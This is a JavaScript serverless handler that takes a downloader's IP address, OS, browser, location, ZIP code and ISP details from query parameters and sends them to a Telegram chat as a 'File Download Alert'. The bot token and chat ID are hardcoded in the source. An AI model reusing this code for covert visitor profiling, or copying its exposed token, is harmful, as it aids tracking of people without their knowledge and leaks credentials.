export default async function handler(req, res) {
  const {
    ip = "UNKNOWN",
    os = "UNKNOWN",
    browser = "UNKNOWN",
    city = "UNKNOWN",
    region = "UNKNOWN",
    country = "UNKNOWN",
    zip = "UNKNOWN",
    timezone = "UNKNOWN",
    isp = "UNKNOWN",
    org = "UNKNOWN",
    as = "UNKNOWN",
    time = new Date().toISOString()
  } = req.query;

  const message = `
✈️ File Download Alert 🚨

🔹 IP: ${ip}
💻 OS: ${os}
🌐 Browser: ${browser}
📍 Location: ${city}, ${region}, ${country}
📮 ZIP: ${zip}
🕒 Timezone: ${timezone}
📡 ISP: ${isp}
🏢 Org: ${org}
🛰 AS: ${as}
🕓 Timestamp: ${time}
`;

  const botToken = "8172380019:AAFD8kht9IQyGbHAsdj0DimVRYcwM2SIbxA";
  const chatId = "-1002479732885";

  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  try {
    const response = await fetch(url);
    const result = await response.json();
    res.status(200).json({ ok: true, telegram: result });
  } catch (error) {
    res.status(500).json({ ok: false, error: error.toString() });
  }
}
